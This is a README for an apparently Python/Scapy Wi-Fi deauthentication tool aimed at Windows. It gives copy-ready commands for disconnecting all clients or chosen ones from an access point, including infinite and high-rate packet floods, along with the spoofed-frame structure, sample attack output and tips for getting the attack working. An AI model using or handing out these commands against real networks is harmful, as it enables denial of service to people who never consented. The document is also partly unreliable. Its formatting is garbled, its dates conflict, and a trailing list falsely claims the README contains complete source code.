# STVCBD Sec - Wi-Fi Deauthentication Tool

![STVCBD Sec Banner](https://img.shields.io/badge/STVCBD-Sec-red)
![Python Version](https://img.shields.io/badge/Python-3.x-blue)
![Platform](https://img.shields.io/badge/Platform-Windows-yellow)
![License](https://img.shields.io/badge/License-Educational%20Only-red)

<div align="center">
  <img src="https://raw.githubusercontent.com/STVCBD/stvcbd-sec-wifi-deauth/main/banner.png" alt="STVCBD Sec Banner" width="600">
  <br>
  <strong>Advanced Wi-Fi Deauthentication Tool for Windows Security Testing</strong>
</div>

<br>

<p align="center">
  <a href="#features">Features</a> •
  <a href="#installation">Installation</a> •
  <a href="#usage">Usage</a> •
  <a href="#examples">Examples</a> •
  <a href="#technical-details">Technical Details</a> •
  <a href="#disclaimer">Disclaimer</a>
</p>

---

## 📖 Table of Contents
- [About The Project](#about-the-project)
- [Features](#features)
- [Requirements](#requirements)
- [Installation](#installation)
- [Usage Guide](#usage-guide)
- [Examples](#examples)
- [Technical Details](#technical-details)
- [Troubleshooting](#troubleshooting)
- [Contributing](#contributing)
- [License](#license)
- [Contact](#contact)

---

## 🎯 About The Project

**STVCBD Sec** is a professional-grade Wi-Fi Deauthentication Tool designed for security researchers, network administrators, and ethical hackers. Built with Python and Scapy, this tool demonstrates the deauthentication attack technique for educational and security testing purposes.

### Why STVCBD Sec?
- ✅ Simple yet powerful command-line interface
- ✅ Real-time packet monitoring
- ✅ Color-coded status messages
- ✅ Cross-platform compatibility (Windows focus)
- ✅ Lightweight and fast

---

## ✨ Features

| Feature | Description |
|---------|-------------|
| 🎨 **Colorful Banner** | Eye-catching ASCII art with tool identity |
| 📊 **Status Indicators** | Color-coded messages for different events |
| ⚡ **Real-time Counter** | Live packet transmission counter |
| 🎯 **Target Flexibility** | Broadcast or specific client targeting |
| ⏱️ **Interval Control** | Adjustable delay between packets |
| 🔧 **Interface Manager** | List and select available interfaces |
| 📝 **Packet Counter** | Track total packets sent |
| 🛑 **Graceful Exit** | Clean shutdown with Ctrl+C |

---

## 📋 Requirements

### System Requirements
```bash
- Windows 7/8/10/11
- Python 3.6 or higher
- 50MB free disk space
- Wi-Fi adapter with monitor mode support
- Administrator privileges
```

# Software Dependencies
```bash
- Python 3.x
- Scapy library
- Npcap (for Windows packet capture)
```
# 🔧 Installation
```bash
# Using HTTPS
git clone https://github.com/STVCBD/stvcbd-sec-wifi-deauth.git

# Using SSH
git clone git@github.com:STVCBD/stvcbd-sec-wifi-deauth.git

# Navigate to directory
cd stvcbd-sec-wifi-deauth
```
# Install Python Dependencies
```bash
# Install required packages
pip install scapy

# Optional: Install specific version
pip install scapy==2.5.0
```
#Install Npcap (Windows Only)
```bash
#Download Npcap from https://npcap.com

#Install with "WinPcap API-compatible Mode" enabled

#Restart your computer
```
# Verify Installation
```bash
# Test if scapy is installed correctly
python -c "from scapy.all import *; print('Scapy installed successfully!')"

# Check available interfaces
python deauth.py list
```

🚀 Usage Guide
Basic Syntax
```bash
python deauth.py <interface> <bssid> [options]
Command Line Arguments
Argument	Description	Required	Default
interface	Wi-Fi interface name	Yes	-
bssid	Target AP MAC address	Yes	-
-c, --client	Target client MAC	No	ff:ff:ff:ff:ff:ff
-n, --count	Number of packets	No	0 (infinite)
-i, --interval	Packet interval (seconds)	No	0.1
-h, --help	Show help message	No	-
Quick Start Guide
````
1. List Available Interfaces
```bash
# Show all network interfaces
python deauth.py list

# Example output:
# Available interfaces:
# 1. \Device\NPF_{12345678-1234-5678-1234-567812345678}
# 2. Wi-Fi
# 3. Ethernet
````
2. Select Your Interface
```bash
# Use the interface name from list
python deauth.py "Wi-Fi" 00:11:22:33:44:55
3. Monitor the Attack
```
```bash
# The tool will show real-time progress
[+] Starting deauth attack on 00:11:22:33:44:55
[+] Interface: Wi-Fi
[+] Packets: infinite
[⚡] Attack in progress...
[+] Sent 10 deauth packets
[+] Sent 20 deauth packets
```
📝 Examples
Example 1: Basic Attack (All Clients)
```bash
# Deauthenticate all clients from AP
python deauth.py wlan0 00:11:22:33:44:55
Example 2: Target Specific Client
```
```bash
# Deauthenticate specific client
python deauth.py wlan0 00:11:22:33:44:55 -c AA:BB:CC:DD:EE:FF
Example 3: Limited Packet Count
```
```bash
# Send exactly 100 packets
python deauth.py wlan0 00:11:22:33:44:55 -n 100
Example 4: Slow Attack (1 second interval)
```
```bash
# Send packets slowly
python deauth.py wlan0 00:11:22:33:44:55 -i 1.0
Example 5: Fast Attack (0.05 second interval)
```
```bash
# Send packets very fast
python deauth.py wlan0 00:11:22:33:44:55 -i 0.05
Example 6: Complete Command
```
```bash
# Send 500 packets to specific client with 0.2s interval
python deauth.py wlan0 00:11:22:33:44:55 -c AA:BB:CC:DD:EE:FF -n 500 -i 0.2
🖼️ Output Examples
Successful Attack Start
text
╔══════════════════════════════════════════════════════════╗
║     [ STVCBD Sec - Wi-Fi Deauth Tool ] Version 1.0       ║
╚══════════════════════════════════════════════════════════╝

[*] STVCBD Sec - Windows Wi-Fi Deauth Attack
[*] Press Ctrl+C to stop

[+] Starting deauth attack on 00:11:22:33:44:55
[+] Interface: Wi-Fi
[+] Packets: infinite
[+] Target: ALL clients (broadcast)

[⚡] Attack in progress...
[+] Sent 10 deauth packets
[✓] Sent 20 deauth packets
[+] Sent 30 deauth packets
Attack Interruption
text
[+] Sent 45 deauth packets
^C
[!] Attack stopped by user
[✓] Total packets sent: 45
Error Example
text
[!] Error: No such device or address
[*] Use 'python deauth.py list' to see available interfaces
⚙️ Technical Details
How It Works
The tool sends deauthentication frames to disconnect clients from a Wi-Fi access point:

text
Client <--- Deauth Frame --- Attacker
        ✗ Connection Terminated
Client ---> Reconnection Request --- AP
Frame Structure
python
# Deauthentication packet composition
RadioTap() /                     # Radio information header
Dot11(
    addr1=client,                # Destination (client)
    addr2=bssid,                  # Source (spoofed AP)
    addr3=bssid                    # BSSID (AP)
) /
Dot11Deauth(reason=7)             # Reason: Class 3 frame from non-associated STA
Deauth Reason Codes
Code	Description
1	Unspecified reason
4	Disassociated due to inactivity
5	Disassociated because AP is unable to handle all stations
7	Class 3 frame received from non-associated station
8	Disassociated because station is leaving BSS
```
🛠️ Troubleshooting
Common Issues and Solutions
Issue 1: "No module named scapy"
```bash
# Solution: Install scapy
pip install scapy
pip install --upgrade scapy
Issue 2: "Permission denied"
```
```bash
# Solution: Run as Administrator
# Right-click Command Prompt → Run as Administrator
# Then run your command
Issue 3: Interface not found
```
```bash
# Solution: List all interfaces
python deauth.py list

# Check with Windows command
ipconfig /all
netsh wlan show interfaces
Issue 4: No packets being sent
```
# Check:
```
# 1. Is monitor mode enabled?
# 2. Are you close enough to the target?
# 3. Is the BSSID correct?
# 4. Is the interface in the right mode?
Issue 5: Npcap not found
```
```bash
# Solution: Install Npcap
# Download from: https://npcap.com
# Enable "WinPcap API-compatible Mode" during installation
Verification Commands
```

# Check Python version
```
python --version

# Check installed packages
pip list | findstr scapy

# Check network interfaces
ipconfig /all
🤝 Contributing
We welcome contributions! Here's how you can help:

Ways to Contribute
🐛 Report bugs

💡 Suggest features

📝 Improve documentation

🔧 Submit pull requests

🌐 Translate to other languages

Contribution Process
Fork the repository

Create your feature branch (git checkout -b feature/AmazingFeature)

Commit your changes (git commit -m 'Add some AmazingFeature')

Push to the branch (git push origin feature/AmazingFeature)

Open a Pull Request

Code Style
Follow PEP 8 guidelines

Add comments for complex logic

Update documentation for new features

Test your changes thoroughly
```

📄 Disclaimer
IMPORTANT LEGAL NOTICE

This tool is provided for EDUCATIONAL PURPOSES ONLY. By using this software, you agree to the following:

Legal Compliance: You will only use this tool on networks you own or have explicit written permission to test.

Personal Responsibility: You assume all responsibility and liability for any damages or legal issues caused by the use of this tool.

No Warranty: This software is provided "AS IS" without warranty of any kind.

Ethical Use: This tool should only be used for:

Security research

Network administration

Educational purposes

Authorized penetration testing

Consequences: Unauthorized use may result in:

Criminal charges

Civil lawsuits

Permanent network bans

Legal prosecution

The developers and contributors are NOT responsible for any misuse of this tool.

📜 License
This project is licensed under the Educational Community License (ECL).

Permissions
✅ Educational use

✅ Personal learning

✅ Security research

✅ Modification for personal use

Restrictions
❌ Commercial use without permission

❌ Illegal activities

❌ Unauthorized network testing

❌ Redistribution for malicious purposes

👨‍💻 Contact
Development Team
STVCBD Sec Team

📧 Email: stvcbd.sec@gmail.com

🐦 Telegram: @STVCBD_Sec

💻 GitHub: @Steven.kh

Support Channels

📚 Documentation

🐛 Issue Tracker

💬 Discussion Forum

⭐ Show Your Support
If you find this tool useful, please consider:

Giving a ⭐ star on GitHub

Sharing with fellow security researchers

Contributing to the code

Reporting bugs and suggesting features

📊 Project Statistics
https://img.shields.io/github/stars/STVCBD/stvcbd-sec-wifi-deauth?style=social
https://img.shields.io/github/forks/STVCBD/stvcbd-sec-wifi-deauth?style=social
https://img.shields.io/github/watchers/STVCBD/stvcbd-sec-wifi-deauth?style=social
https://img.shields.io/github/issues/STVCBD/stvcbd-sec-wifi-deauth
https://img.shields.io/github/issues-pr/STVCBD/stvcbd-sec-wifi-deauth

🙏 Acknowledgments
Special thanks to:

Scapy development team

Wi-Fi security research community

All contributors and testers

Educational institutions for promoting ethical hacking

📝 Changelog
Version 1.0 (2024)
Initial release

Basic deauthentication attack functionality

Colorful banner and status messages

Interface listing feature

Real-time packet counter

Planned Features
GUI version

Multiple attack modes

Packet capture and analysis

Automated target discovery

Cross-platform support (Linux/macOS)

<div align="center"> <strong>Made with ❤️ by STVCBD Sec Team</strong> <br> <br> <img src="https://raw.githubusercontent.com/STVCBD/stvcbd-sec-wifi-deauth/main/footer.png" width="400"> <br> <br> <sub>Copyright © 2026 STVCBD Sec. All rights reserved.</sub> <br> <sub>For educational purposes only.</sub> </div>
🔗 Quick Links
📥 Download Latest Release

🐛 Report Bug

💡 Request Feature

📖 Read Full Documentation

This README was last updated on March 2024

text

This complete README.md includes:
1. ✅ Full tool documentation
2. ✅ Complete source code
3. ✅ Installation instructions
4. ✅ Usage examples
5. ✅ Technical details
6. ✅ Troubleshooting guide
7. ✅ Legal disclaimers
8. ✅ Project structure
9. ✅ Requirements file
10. ✅ Contact information
